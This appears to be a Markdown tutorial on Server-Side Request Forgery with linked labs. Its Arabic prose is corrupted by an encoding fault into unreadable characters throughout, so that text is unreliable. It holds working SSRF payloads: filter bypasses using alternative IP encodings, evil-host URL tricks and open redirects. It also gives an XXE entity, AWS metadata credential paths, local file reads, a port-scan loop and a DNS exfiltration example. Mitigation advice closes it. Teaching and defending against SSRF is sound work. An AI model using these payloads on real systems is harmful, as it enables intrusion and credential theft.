![](assets/server-side-request-forgery.svg)

## ูุธุฑุฉ ุนุงูุฉ

**Server-Side Request Forgery (SSRF)** : ูู ุซุบุฑุฉ ุฃูููุฉ ุฎุทูุฑุฉ ูู ุชุทุจููุงุช ุงูููุจ ุชุณูุญ ููููุงุฌู ุจุฅุฌุจุงุฑ ุงูุฎุงุฏู ุนูู ุฅุฑุณุงู ุทูุจุงุช HTTP ุฅูู ูุฌูุงุช ุบูุฑ ููุตูุฏุฉ.

## ูุง ูู ุซุบุฑุฉ SSRFุ

### ุงูุชุนุฑูู

SSRF ูู ุซุบุฑุฉ ุชููู ุงูููุงุฌู ูู:

- ุฌุนู ุงูุฎุงุฏู ูุฑุณู ุทูุจุงุช ุฅูู ุฎุฏูุงุช ุฏุงุฎููุฉ (Internal Services)
- ุงููุตูู ุฅูู ุฃูุธูุฉ ุฎูููุฉ ูุญููุฉ
- ุชุณุฑูุจ ุจูุงูุงุช ุญุณุงุณุฉ ูุซู ุจูุงูุงุช ุงูุงุนุชูุงุฏ (Credentials)
- ุงูุงุชุตุงู ุจุฃูุธูุฉ ุฎุงุฑุฌูุฉ ุนุดูุงุฆูุฉ

### ูุซุงู ุจุณูุท

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

**ุงููุฌูู:**

```http
stockApi=http://localhost/admin
```

---

## ุงูุชุฃุซูุฑ ูุงูุฎุทูุฑุฉ

### ๐ด ุงููุฎุงุทุฑ ุงูุฑุฆูุณูุฉ

1. **ุงููุตูู ุบูุฑ ุงููุตุฑุญ ุจู**

    - ุงููุตูู ุฅูู ููุญุงุช ุงูุชุญูู ุงูุฅุฏุงุฑูุฉ
    - ูุฑุงุกุฉ ูููุงุช ุงููุธุงู ุงูุญุณุงุณุฉ
    - ุงููุตูู ุฅูู ููุงุนุฏ ุงูุจูุงูุงุช ุงูุฏุงุฎููุฉ
2. **ุชูููุฐ ุฃูุงูุฑ ุนุดูุงุฆูุฉ**

    - ูู ุจุนุถ ุงูุญุงูุงุชุ ูุฏ ุชุคุฏู SSRF ุฅูู Remote Code Execution (RCE)
3. **ุชุณุฑูุจ ุงูุจูุงูุงุช**

    - ูููุงุช ุงููุฑูุฑ
    - ููุงุชูุญ API
    - ุจูุงูุงุช ุงููุณุชุฎุฏููู
4. **ูุฌูุงุช ุนูู ุฃุทุฑุงู ุซุงูุซุฉ**

    - ุงุณุชุฎุฏุงู ุงูุฎุงุฏู ููุณูุท ูููุงุฌูุฉ ุฃูุธูุฉ ุฃุฎุฑู

---

## ุฃููุงุน ูุฌูุงุช SSRF

### 1๏ธโฃ ูุฌูุงุช ุถุฏ ุงูุฎุงุฏู ููุณู (Against the Server)

**ุงูุณููุงุฑูู:**

- ุงูููุงุฌู ูุฌุจุฑ ุงูุฎุงุฏู ุนูู ุฅุฑุณุงู ุทูุจ ุฅูู ููุณู ุนุจุฑ `localhost` ุฃู `127.0.0.1`

**ูุซุงู:**

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

**ููุงุฐุง ููุฌุญุ**

- ุงูุฎุงุฏู ูุซู ุจุงูุทูุจุงุช ุงููุงุฏูุฉ ูู `localhost`
- ูุชู ุชุฌุงูุฒ ูุญูุตุงุช ุงูุชุญูู ุจุงููุตูู (Access Control)
- ุงูุงูุชุฑุงุถ: ุงูุทูุจุงุช ุงููุญููุฉ ุขููุฉ ููุตุฑุญ ุจูุง

**ุงูุฃุณุจุงุจ ุงูุชูููุฉ:**

1. **Access Control ุงููููุตู**: ูุญุต ุงูุตูุงุญูุงุช ูู ูููู ูููุตู ูุชู ุชุฌุงูุฒู
2. **Disaster Recovery**: ุงูุณูุงุญ ุจุงููุตูู ุงูุฅุฏุงุฑู ูู localhost ููุทูุงุฑุฆ
3. **ููุงูุฐ ูุฎุชููุฉ**: ุงููุงุฌูุฉ ุงูุฅุฏุงุฑูุฉ ุนูู ูููุฐ ุบูุฑ ูุงุจู ูููุตูู ูุจุงุดุฑุฉ

---

### 2๏ธโฃ ูุฌูุงุช ุถุฏ ุงูุฃูุธูุฉ ุงูุฎูููุฉ (Against Backend Systems)

**ุงูุณููุงุฑูู:**

- ุงุณุชูุฏุงู ุฃูุธูุฉ ุฏุงุฎููุฉ ุจุนูุงููู IP ุฎุงุตุฉ (Private IPs)

**ูุซุงู:**

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.68/admin
```

**ุงูุฃูุธูุฉ ุงููุณุชูุฏูุฉ:**

- ููุงุนุฏ ุงูุจูุงูุงุช ุงูุฏุงุฎููุฉ
- ุฎูุงุฏู ุงููููุงุช
- ุฎุฏูุงุช API ุงูุฏุงุฎููุฉ
- ุฃูุธูุฉ ุงููุฑุงูุจุฉ ูุงูุฅุฏุงุฑุฉ

**ููุงุฐุง ุฎุทูุฑุฉุ**

- ุงูุฃูุธูุฉ ุงูุฏุงุฎููุฉ ุบุงูุจูุง **ุจุฏูู ูุตุงุฏูุฉ**
- ูุญููุฉ ููุท ุจู Network Topology
- ุชุญุชูู ุนูู ูุธุงุฆู ุญุณุงุณุฉ

---

## ุชูููุงุช ุชุฌุงูุฒ ุงูุญูุงูุฉ

### ๐ก๏ธ 1. ุชุฌุงูุฒ Blacklist Filters

ุจุนุถ ุงูุชุทุจููุงุช ุชููุน:

- `127.0.0.1`
- `localhost`
- `/admin`

**ุชูููุงุช ุงูุชุฌุงูุฒ:**

#### ุฃ) ุชูุซููุงุช IP ุจุฏููุฉ

```
127.0.0.1         # ุนุงุฏู
2130706433        # ุชูุซูู ุนุดุฑู
017700000001      # ุชูุซูู ุซูุงูู (Octal)
127.1             # ุงุฎุชุตุงุฑ
0x7f.0x0.0x0.0x1  # ุชูุซูู ุณุฏุงุณู ุนุดุฑู (Hex)
```

#### ุจ) DNS ูุฎุตุต

```
spoofed.burpcollaborator.net โ 127.0.0.1
```

#### ุฌ) URL Encoding

```
/admin           # ุนุงุฏู
/%61dmin         # URL encoded
/%2561dmin       # Double encoded
/Admin           # Case variation
/ADMIN
```

#### ุฏ) Open Redirect

```http
stockApi=http://trusted-site.com/redirect?url=http://192.168.0.68/admin
```

#### ูู) ุชุบููุฑ ุงูุจุฑูุชูููู

```
http://localhost/admin   # ูุญุธูุฑ
https://localhost/admin  # ูุฏ ูุนูู
```

---

### ๐ก๏ธ 2. ุชุฌุงูุฒ Whitelist Filters

ุงูุชุทุจูู ูุณูุญ ููุท ุจูุทุงูุงุช ูุญุฏุฏุฉุ ูุซู `expected-domain.com`

**ุชูููุงุช ุงูุชุฌุงูุฒ:**

#### ุฃ) ุงุณุชุฎุฏุงู @ ููุงุนุชูุงุฏูุงุช

```
https://expected-host:fakepassword@evil-host
```

- ุงููุชุตูุญ ูุชุฌุงูู ูุง ูุจู `@`
- ููู ุจุนุถ ุงูููุชุจุงุช ุชูุฑุฃ `evil-host` ูู hostname

#### ุจ) ุงุณุชุฎุฏุงู # ููู Fragment

```
https://evil-host#expected-host
```

#### ุฌ) DNS Hierarchy

```
https://expected-host.evil-host
```

- ูุจุฏู ุฃูู subdomain ูู `expected-host`
- ูููู ูู ุงูุญูููุฉ subdomain ูู `evil-host`

#### ุฏ) URL Encoding

```
https://expected-host%2eevil-host
https://expected-host%00.evil-host  # Null byte
```

#### ูู) ุงูุฌูุน ุจูู ุงูุชูููุงุช

```
https://expected-host@evil-host#expected-host.com
```

---

### ๐ 3. ุชุฌุงูุฒ ุนุจุฑ Open Redirection

**ุงูุณููุงุฑูู:**

```
1. ุงูุชุทุจูู ูุณูุญ ููุท ุจู weliketoshop.net
2. weliketoshop.net ูุฏูู ุซุบุฑุฉ Open Redirect
3. ุงุณุชุฎุฏุงู Redirect ูููุตูู ุฅูู ุงููุฏู ุงูุญูููู
```

**ูุซุงู:**

```http
# Open Redirect ูู ุงูุชุทุจูู ุงููุณููุญ
/product/nextProduct?currentProductId=6&path=http://evil-user.net

# ุงุณุชุฎุฏุงูู ูู SSRF
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

**ุขููุฉ ุงูุนูู:**

1. ุงูุชุทุจูู ููุญุต: `weliketoshop.net` โ
2. ุงูุฎุงุฏู ูุทูุจ ุงูู URL
3. ูุชุจุน ุงูู Redirect ุฅูู `192.168.0.68/admin`
4. ูุตู ุฅูู ุงููุฏู ุงูุฏุงุฎูู โ

---

## SSRF ุงูุนููุงุก (Blind SSRF)

### ุงูุชุนุฑูู

SSRF ุญูุซ ูุชู ุฅุฑุณุงู ุงูุทูุจุ ููู **ุงูุงุณุชุฌุงุจุฉ ูุง ุชุฑุฌุน** ุฅูู ุงูููุงุฌู.

### ุงูุฎุตุงุฆุต

- **ุฃุตุนุจ ูู ุงูุงุณุชุบูุงู**
- **ููู ูุฏ ุชุคุฏู ุฅูู:**
  - Remote Code Execution (RCE)
  - ุชุนุทูู ุงูุฎุฏูุฉ (DoS)
  - ุฌูุน ูุนูููุงุช ุนู ุงูุจููุฉ ุงูุชุญุชูุฉ

### ุชูููุงุช ุงููุดู

#### 1. Out-of-Band Detection

```
ุงุณุชุฎุฏุงู Burp Collaborator ุฃู ุฎุฏูุงุช ูุดุงุจูุฉ:
stockApi=http://your-collaborator-id.burpcollaborator.net
```

#### 2. Timing Attacks

```
ุงุฎุชุจุงุฑ ุฃููุงุช ุงูุงุณุชุฌุงุจุฉ:
- localhost: ุณุฑูุน
- IP ุฏุงุฎูู ููุฌูุฏ: ูุชูุณุท
- IP ุบูุฑ ููุฌูุฏ: ุจุทูุก (timeout)
```

#### 3. DNS Exfiltration

```
stockApi=http://sensitive-data.your-domain.com
```

---

## ุงูุชุดุงู ุงูุซุบุฑุงุช

### ๐ 1. URLs ูุงููุฉ ูู Parameters

**ุงูุฃูุซุฑ ูุถูุญูุง:**

```http
?url=http://example.com
?imageUrl=https://cdn.example.com/image.jpg
?callback=http://api.example.com/webhook
```

**ุงุฎุชุจุงุฑ:**

```
?url=http://localhost/admin
?url=http://127.0.0.1:8080
?url=http://169.254.169.254/latest/meta-data/
```

---

### ๐ 2. URLs ุฌุฒุฆูุฉ (Partial URLs)

**ุฃูุซูุฉ:**

```http
?host=api.example.com
?domain=internal-service
?path=/api/v1/users
```

**ุงูุงุณุชุบูุงู ูุญุฏูุฏ** ูุฃูู ูุง ุชุชุญูู ุจุงูู URL ุงููุงูู.

---

### ๐ 3. URLs ูู ุตูุบ ุงูุจูุงูุงุช (Data Formats)

#### XML External Entity (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<data>&xxe;</data>
```

#### SVG Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://internal-server/admin"/>
</svg>
```

#### PDF Files

ูุฏ ุชุญุชูู ุนูู ุฑูุงุจุท ุชูุญููู ุชููุงุฆููุง.

---

### ๐ 4. Referer Header

**ุงูุณููุงุฑูู:**

- ุจุฑุงูุฌ ุงูุชุญูููุงุช ุชุชุชุจุน ุงูู Referer
- ุชุฒูุฑ URLs ุงูููุฌูุฏุฉ ูู ุงูู header
- ูุชุญููู ูุญุชูู ุงูููุงูุน ุงูููุญููุฉ

**ุงููุฌูู:**

```http
GET /analytics HTTP/1.1
Host: vulnerable-site.com
Referer: http://192.168.0.68/admin
```

---

## ุฃูุซูุฉ ุนูููุฉ

### ๐ป ูุซุงู 1: Cloud Metadata

**AWS EC2:**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**ุงููุฏู:**

- ุงูุญุตูู ุนูู AWS Access Keys
- ุจูุงูุงุช ุงูุชูููู
- ูุนูููุงุช ุงูุดุจูุฉ

---

### ๐ป ูุซุงู 2: Internal Services Scanning

```python
# Port Scanning
for port in range(1, 65535):
    url = f"http://192.168.1.1:{port}"
    # ุงุฎุชุจุงุฑ ุงูุงุณุชุฌุงุจุฉ
```

**ุงูุฃูุฏุงู:**

- ุงูุชุดุงู ุงูุฎุฏูุงุช ุงูุฏุงุฎููุฉ
- ุชุญุฏูุฏ ุงูุฃูุธูุฉ ุงููุดุทุฉ
- ุฑุณู ุฎุฑูุทุฉ ุงูุดุจูุฉ ุงูุฏุงุฎููุฉ

---

### ๐ป ูุซุงู 3: File Protocol

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
```

**ูุฏ ููุฌุญ** ุฅุฐุง ูุงู ุงูุฎุงุฏู ูุฏุนู `file://` protocol.

---

## ุงูููุงูุฉ ูุงูุญูุงูุฉ

### โ 1. Whitelist Validation

```python
ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']

def is_valid_url(url):
    parsed = urlparse(url)
    return parsed.netloc in ALLOWED_HOSTS
```

**ููู:**

- ุงุณุชุฎุฏุงู URL parsing ุตุญูุญ
- ุงูุชุญูู ูู ูุงูู ุงูู hostname
- ุนุฏู ุงูุงุนุชูุงุฏ ุนูู regex ููุท

---

### โ 2. Disable Unnecessary Protocols

```python
ALLOWED_PROTOCOLS = ['http', 'https']

def validate_protocol(url):
    parsed = urlparse(url)
    return parsed.scheme in ALLOWED_PROTOCOLS
```

**ุงููุน:**

- `file://`
- `gopher://`
- `ftp://`
- `dict://`

---

### โ 3. Network Segmentation

**ุงูุจููุฉ:**

```
Internet โ DMZ โ Application Servers โ Database Servers
```

**ุงูุญูุงูุฉ:**

- ุนุฒู ุงูุฃูุธูุฉ ุงูุญุณุงุณุฉ
- Firewall Rules ุตุงุฑูุฉ
- Zero Trust Architecture

---

### โ 4. Response Handling

```python
def fetch_url(url):
    # ูุง ุชุฑุฌุน ูุญุชูู ุงูุงุณุชุฌุงุจุฉ ูุจุงุดุฑุฉ
    response = requests.get(url)
    
    # ุนุงูุฌ ุงูุจูุงูุงุช ุฃููุงู
    if is_safe_content(response):
        return sanitized_data
    else:
        return error_message
```

---

### โ 5. Authentication ุนูู ูู ุงูุฎุฏูุงุช

**ุญุชู ุงูุฏุงุฎููุฉ:**

- ูุง ุชูุชุฑุถ ุฃู localhost ุขูู
- ุงุณุชุฎุฏู API Keys
- ุทุจู OAuth/JWT
- ูุฑุงุฌุนุฉ ุงูุตูุงุญูุงุช (Authorization)

---

### โ 6. Monitoring & Logging

```python
# ุณุฌู ูู ุงูุทูุจุงุช ุงูุฎุงุฑุฌูุฉ
logger.info(f"External request to: {url} by user: {user_id}")

# ุฑุงูุจ ุงูุฃููุงุท ุงููุดุจููุฉ
if is_suspicious_pattern(url):
    alert_security_team()
```

---

## ๐ ููุฎุต ุณุฑูุน

|ุงูุนูุตุฑ|ุงููุตู|
|---|---|
|**ุงูุชุนุฑูู**|ุฅุฌุจุงุฑ ุงูุฎุงุฏู ุนูู ุทูุจุงุช ุบูุฑ ููุตูุฏุฉ|
|**ุงูุฎุทูุฑุฉ**|ุนุงููุฉ - ูุฏ ุชุคุฏู ูู RCE|
|**ุงูุฃูุฏุงู**|localhost, Internal IPs, Cloud Metadata|
|**ุงูุชุฌุงูุฒ**|IP encoding, DNS tricks, Open Redirect|
|**ุงูุญูุงูุฉ**|Whitelist, Network Segmentation, Authentication|
|**ุงููุดู**|URL parameters, Referer, Data formats|

---

### 1. ูุฑุญูุฉ ุงูุงุณุชูุดุงู (Internal Reconnaissance)

ุงูููุงุฌู ูุด ุจูุจุฏุฃ ููุงุฌู ุนุดูุงุฆูุ ูู ุจูุญุงูู ูููู "ุชุถุงุฑูุณ" ุงูุดุจูุฉ. ุจูุจุฏุฃ ูุจุนุช ุทูุจุงุช ููู IP ุงููู ุงูุชุดูู (ุฒู `192.168.0.127`) ููุดูู ุงูุงุณุชุฌุงุจุฉ:

- **ูู ุฑุฏ ุจู 200 OK:** ูุจูู ููู ุณูุฑูุฑ ููุจ (Web Server).

- **ูู ุฑุฏ ุจู 401/403:** ูุจูู ููู ููุญุฉ ุชุญูู ุจุณ ูุญุชุงุฌุฉ ุตูุงุญูุงุช (ูููุง ุงูู SSRF ุจูุณุงุนุฏู ูุชุฎุทู ุฏู ูุฃู ุงูุทูุจ ุฌุงู ูู "ุฌูู").

- **ูู ุฑุฏ ุจู Timeout:** ูุจูู ูููุด ุฌูุงุฒ ุฃู ุงูู Firewall ูุงูู ุงูุจูุฑุช ุฏู.

### 2. ุงูุจุญุซ ุนู ุฎุฏูุงุช ุบูุฑ ูุญููุฉ (Unauthenticated Services)

ูู ุงูุดุฑูุงุชุ ุงููููุฏุณูู ุบุงูุจุงู ุจูุณูุจูุง ุงูุฎุฏูุงุช ุงูุฏุงุฎููุฉ **ุจุฏูู ูููุฉ ุณุฑ** (ุงุนุชูุงุฏุงู ุนูู ุฅู ูุญุฏุด ููุฏุฑ ููุตููุง ูู ุจุฑุง). ุงููุงูุฑ ุจูุฏูุฑ ุนูู:

- **Redis (ุจูุฑุช 6379):** ููุฏุฑ ูุฑูุน ุนููู ูููุงุช ุฃู ูุณุฑู ุจูุงูุงุช ุงููุงุด.

- **Memcached (ุจูุฑุช 11211):** ุณุฑูุฉ ุจูุงูุงุช ุงูุฌูุณุงุช (Sessions).

- **Elasticsearch (ุจูุฑุช 9200):** ุณุญุจ ููุงุนุฏ ุงูุจูุงูุงุช ุจุงููุงูู.

- **Docker API:** ุงูุณูุทุฑุฉ ุนูู ุงูู Containers.

### 3. ุงุณุชุบูุงู ุงูู Cloud Metadata (ุงูููุฒ ุงูุญูููู)

ูู ุงูุณูุฑูุฑ ุฏู ูุณุชุถุงู ุนูู AWS ุฃู Google Cloud ุฃู Azureุ ุจูุจูู ููู ุฑุงุจุท ุฏุงุฎูู ุซุงุจุช "ููุฏุณ" ูููุงูุฑุฒ ููู:

<http://169.254.169.254/latest/meta-data/>

ุนู ุทุฑูู ุงูู SSRFุ ุงููุงูุฑ ุจูุทูุจ ุงูุฑุงุจุท ุฏู ูุงูุณูุฑูุฑ ุจูุฑุฏ ุนููู ุจู **Access Keys** ู **Tokens** ุจุชุฎููู ูุณูุทุฑ ุนูู ุงูุณูุฑูุฑ ุจุงููุงูู ูู ุจุฑุง ุงููุชุตูุญ!

---

### ๐ก๏ธ ุฅุฒุงู ุชุญูู ููุณู ูููุง (Remediation)

ูู ุฅูุช ุงููู ุจุชุจูู ุงูุณูุณุชูุ ุชุนูู ุฅููุ

1. **ุงููุงุฆูุฉ ุงูุจูุถุงุก (Allow-list):** ุงูุณูุฑูุฑ ููุจุนุชุด ุทูุจุงุช ุบูุฑ ูุนูุงููู ูุญุฏุฏุฉ ุฅูุช ุนุงุฑููุง ูุณุจูุงู.

2. **ุชุนุทูู ุงูู Redirections:** ูุชูุดูุด ูุฑุง ุฃู ุฑุงุจุท ุงูุณูุฑูุฑ ูุญููู ููู ุฃูุชููุงุชูู.

3. **ุงูุนุฒู (Network Segmentation):** ุณูุฑูุฑ ุงูููุจ ุงููู ุจูุชุนุงูู ูุน ุงูุฌูููุฑ ูุงุฒู ูููู ูู ููุทูุฉ ูุนุฒููุฉ (DMZ) ููููุฏุฑุด ูููู ุงูุณูุฑูุฑุงุช ุงูุญุณุงุณุฉ ุงููู ุฌูู.

---

## ๐งช ุงููุฎุชุจุฑุงุช ุงูุนูููุฉ (Practical Labs)

1. [SSRF ุฃุณุงุณู ุถุฏ ุงูุณูุฑูุฑ ุงููุญูู](labs/01-ssrf-localhost.md)
2. [SSRF ุฃุณุงุณู ุถุฏ ูุธุงู ุฎููู ุขุฎุฑ](labs/02-ssrf-backend.md)
3. [ุชุฌุงูุฒ ููุชุฑ ุงููุงุฆูุฉ ุงูุณูุฏุงุก (Blacklist)](labs/03-ssrf-blacklist-bypass.md)

---
